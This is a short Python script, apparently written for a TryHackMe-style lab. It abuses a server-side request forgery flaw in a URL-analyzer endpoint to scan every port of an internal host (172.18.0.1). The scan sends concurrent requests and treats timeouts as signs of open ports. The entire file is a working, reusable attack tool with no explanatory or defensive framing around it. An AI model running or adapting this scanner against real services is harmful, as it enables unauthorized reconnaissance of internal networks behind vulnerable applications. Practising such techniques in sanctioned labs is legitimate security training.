import asyncio
import aiohttp
import time

TARGET_URL = "http://url-analyzer.hopaitech.thm/analyze"
HEADERS = {
    "Content-Type": "application/json",
    "Accept": "*/*",
    "User-Agent": "Mozilla/5.0"
}

SOFT_TIMEOUT = 3.0     # Mark candidate after this
CONCURRENCY = 100
TOTAL_PORTS = 65535

semaphore = asyncio.Semaphore(CONCURRENCY)

async def probe_port(session, port):
    payload = {"url": f"http://172.18.0.1:{port}"}

    async with semaphore:
        start = time.perf_counter()
        try:
            # We use a single unified timeout for the POST request
            async with asyncio.timeout(SOFT_TIMEOUT):
                async with session.post(TARGET_URL, json=payload, headers=HEADERS) as resp:
                    # Read the response body to ensure the request fully completes
                    await resp.read() 
                    
            elapsed = time.perf_counter() - start
            # Optional: Uncomment if you want to see closed ports
            # print(f"[-] Port {port:5d} fast ({elapsed:.2f}s)")

        except TimeoutError:
            elapsed = time.perf_counter() - start
            print(f"[+] Port {port:5d} SLOW ({elapsed:.2f}s) <-- candidate (moving on)")
            
        except Exception as e:
            # Uncomment if you need to debug connection drops or drops
            # print(f"[!] Port {port:5d} ERROR ({e})")
            pass

async def main():
    # Disable global session timeouts so our per-request timeouts handle the logic
    timeout = aiohttp.ClientTimeout(total=None)
    connector = aiohttp.TCPConnector(limit=CONCURRENCY)

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        tasks = [probe_port(session, port) for port in range(1, TOTAL_PORTS + 1)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    print(f"[*] Starting SSRF Port Scan against {TARGET_URL}...")
    start_time = time.perf_counter()
    asyncio.run(main())
    print(f"[*] Scan completed in {time.perf_counter() - start_time:.2f} seconds.")